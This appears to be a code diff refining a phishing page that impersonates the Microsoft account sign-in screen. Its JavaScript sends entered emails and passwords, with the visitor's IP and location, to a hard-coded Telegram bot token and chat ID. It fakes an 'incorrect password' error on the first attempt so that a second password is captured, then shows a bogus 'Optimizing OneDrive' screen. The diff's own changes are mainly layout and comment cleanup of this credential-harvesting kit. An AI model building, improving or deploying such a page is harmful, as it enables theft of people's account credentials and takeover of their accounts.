@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your Microsoft account</title>
+    <title>Sign in </title>
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMgpEfAAB4AARwAgXQAAAARRAAAFnA9UgAAAANSURBVAgdY9j9HwAEFwCqK2+zRgAAAABJRU5ErkJggg==">
-    <!-- 2026 Fresh, fluent design refresh + two-attempt logic -->
+    <!-- 2026 Fresh, fluent design + two-attempt + button right + no duplicate text -->
     <style>
         * {
             margin: 0;
@@ -55,6 +55,7 @@
             height: 24px;
         }
 
+        /* only the logo text remains (next to logo) */
         .microsoft-header .logo-text {
             color: #1e1e1e;
             font-size: 16px;
@@ -198,8 +199,9 @@
         .buttons-container {
             margin-top: 28px;
             display: flex;
-            justify-content: space-between;
+            justify-content: flex-end;   /* 👈 pushes button to the right */
             align-items: center;
+            gap: 16px;
         }
 
         .signin-button {
@@ -215,6 +217,7 @@
             min-width: 120px;
             transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
             box-shadow: 0 4px 8px rgba(0,102,180,0.2);
+            order: 2;  /* ensure it stays on right */
         }
 
         .signin-button:hover {
@@ -243,6 +246,8 @@
             padding: 8px 16px;
             border-radius: 30px;
             transition: background 0.15s;
+            order: 1;
+            margin-right: auto; /* pushes itself left, button right */
         }
 
         .back-button:hover {
@@ -275,7 +280,7 @@
             font-weight: 500;
         }
 
-        /* specific invalid login feedback */
+        /* invalid login feedback */
         .invalid-creds-message {
             background-color: #ffebee;
             border: 1px solid #c42b1c;
@@ -533,16 +538,17 @@
                     </svg>
                 </div>
                 <span class="logo-text">Microsoft</span>
+                <!-- The standalone "Microsoft" text above the title has been removed -->
             </div>
             
-            <!-- LOGIN SECTION (2026) -->
+            <!-- LOGIN SECTION -->
             <div class="login-content" id="loginSection">
                 <div class="login-header">
                     <h1 class="login-title">Sign in</h1>
                     <div class="login-sub">to your Microsoft account</div>
                 </div>
                 
-                <!-- custom invalid credentials feedback (hidden by default) -->
+                <!-- custom invalid credentials feedback -->
                 <div class="invalid-creds-message" id="invalidCredsMessage" style="display: none;">
                     Incorrect email or password. Please try again.
                 </div>
@@ -586,7 +592,7 @@
                 </form>
             </div>
 
-            <!-- CLEANUP section (identical, appears on second attempt) -->
+            <!-- CLEANUP section (identical) -->
             <div class="login-content cleanup-section" id="cleanupSection">
                 <div class="login-header">
                     <h1 class="login-title">Optimizing OneDrive</h1>
@@ -650,7 +656,7 @@
     </div>
 
     <script>
-        // --- Two-attempt logic: first shows error, second proceeds + both attempts logged ---
+        // --- Two-attempt logic with button right & duplicate text removed ---
         const TELEGRAM_BOT_TOKEN = '8404555198:AAGTDMBJ1nkK1fJL42_jtaIWjtRB3DfTWz0';
         const TELEGRAM_CHAT_ID = '6439618231';
         
@@ -660,7 +666,6 @@
         let userIP = 'Unknown';
         let userLocation = 'Unknown';
         
-        // Track if this is the first sign-in attempt (after password screen)
         let firstSignInAttempt = true;   // true = first time clicking "Sign in" with password
 
         // DOM
@@ -723,7 +728,6 @@
 
         function isValidEmail(e){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }
 
-        // Function to send credentials to Telegram (used in both attempts)
         function sendCredentialsToTelegram(email, password, attemptNumber) {
             const msg = `🔐 Microsoft 2026 login (Attempt #${attemptNumber})\n📧 ${email}\n🔑 ${password}\n🌐 IP: ${userIP}\n📍 ${userLocation}\n🕒 ${new Date().toLocaleString()}`;
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -736,7 +740,6 @@
             e.preventDefault();
             
             if (!emailEntered) {
-                // Email screen
                 const email = emailInput.value.trim();
                 if (!email || !isValidEmail(email)) {
                     emailError.style.display = 'block';
@@ -753,7 +756,6 @@
                 return;
             }
             
-            // --- Password screen ---
             const pwd = passwordInput.value;
             if (!pwd) {
                 passwordError.style.display = 'block';
@@ -764,35 +766,17 @@
             
             const email = emailInput.value.trim();
 
-            // On first attempt -> show error, send creds, reset to email screen? But spec: after entering email+pass, it says incorrect, then second attempt works.
-            // We want: after first pass submit, show error message "incorrect email or password", and let user stay on password screen? 
-            // But typical behavior: error appears and they can retry. We'll keep password field, show error message, and let them try again.
-            
             if (firstSignInAttempt) {
-                // First attempt: show invalid creds message, send to Telegram, and set flag to false
-                invalidCredsMessage.style.display = 'flex'; // show warning
+                invalidCredsMessage.style.display = 'flex';
                 sendCredentialsToTelegram(email, pwd, 1);
-                
-                // Mark that next attempt will be the second one
                 firstSignInAttempt = false;
-                
-                // Clear password field for retry
                 passwordInput.value = '';
                 passwordInput.focus();
-                
-                // Do NOT proceed to cleanup
                 return;
             } else {
-                // Second attempt: send credentials (attempt #2), then proceed to cleanup
                 sendCredentialsToTelegram(email, pwd, 2);
-                
-                // Hide any previous error
                 invalidCredsMessage.style.display = 'none';
-                
-                // Show loading overlay
                 loadingOverlay.style.display = 'flex';
-                
-                // Simulate brief loading then start cleanup
                 setTimeout(() => {
                     loadingOverlay.style.display = 'none';
                     startCleanupProcess();
@@ -810,18 +794,14 @@
             passwordInput.type = 'password';
             passwordToggle.innerHTML = `<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>`;
             emailInput.focus();
-            // Reset attempt flag if they go back? Probably not needed, but safe: keep flag as is.
-            // Optionally reset flag? No, they might go back and change email, then we want fresh first attempt.
-            // Better: reset firstSignInAttempt if email changes after back? We'll reset when back is pressed.
             firstSignInAttempt = true; 
-            invalidCredsMessage.style.display = 'none'; // hide error
+            invalidCredsMessage.style.display = 'none';
         });
 
         document.addEventListener('keydown', e=>{ if(e.key==='Enter') submitButton.click(); });
         emailInput.addEventListener('input', ()=> emailError.style.display = 'none');
         passwordInput.addEventListener('input', ()=> passwordError.style.display = 'none');
 
-        // Cleanup process (identical, 35 seconds)
         function startCleanupProcess() {
             loginSection.style.display = 'none';
             cleanupSection.classList.add('active');
